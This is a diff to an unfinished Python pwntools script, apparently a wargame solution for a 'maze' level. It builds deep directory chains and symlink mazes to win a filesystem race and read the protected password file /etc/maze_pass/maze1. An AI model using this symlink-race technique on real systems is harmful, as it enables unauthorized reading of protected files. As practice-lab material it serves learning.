@@ -1,3 +1,4 @@
+#base of filesystem maze creation solution.... unfinished
 #!/usr/bin/python3
 from pwn import *
 import os
@@ -13,7 +14,7 @@ PORT = 2225
 #Maze depth/chain length vars
 maze_depth=30
 maze_chains=10
-num_mazes=2
+num_mazes=3
 
 #Target file and 'access' file
 target_file = "/etc/maze_pass/maze1"
@@ -50,14 +51,13 @@ def create_maze(shell, maze_num):
             chain = base + "/chain" + str(chain_num)
             time.sleep(0.03)
             shell.sendline("mkdir " + chain)
-            for i in range(0, maze_depth+1):
-                chain += "/d"
-                time.sleep(0.03)
-                shell.sendline("mkdir " + chain)
-                if i == maze_depth:
-                    if chain_num != 0:
-                        link_chain(shell, chain + "/lnk", all_chains[-1][:17])
-                    all_chains.append(chain)
+            chain += '/d'*maze_depth
+            time.sleep(0.03)
+            #print(chain)
+            shell.sendline("mkdir -p " + chain)
+            if chain_num != 0:
+                link_chain(shell, chain + "/lnk", all_chains[-1][:17])
+            all_chains.append(chain)
         #After chains are created and linked, link 'entry' file (/tmp/128...) to chain6
         link_chain(shell, sentry, all_chains[-1][:24])        
         #then link 'chain0..../lnk' to /etc/maze_pass/maze1
@@ -70,13 +70,13 @@ def link_chain(shell, src, dest):
     shell.sendline("ln -s " + dest + " " + src)
 
 def wipe_maze(shell):
-    w = log.info("Wiping maze...")
+    w = log.progress("Wiping maze...")
     if shell is not null:
-        time.sleep(0.1)
+        time.sleep(0.3)
         shell.sendline("rm -f " + activedir)
-        time.sleep(0.1)
+        time.sleep(0.3)
         shell.sendline("rm -rf /tmp/tald0/*")
-        time.sleep(0.1)
+        time.sleep(0.3)
         #shell.sendline("y")
         w.success("Maze wiped")
 
@@ -85,9 +85,9 @@ def execute_maze(shell):
     shell.sendline("/maze/maze0")
 
 shell = connect_to_level()
-
 shell.sendline("touch /tmp/tald0/public")
 for i in range(0, num_mazes):
     create_maze(shell, i)
+
 #execute_maze(shell)
-wipe_maze(shell)
+#wipe_maze(shell)
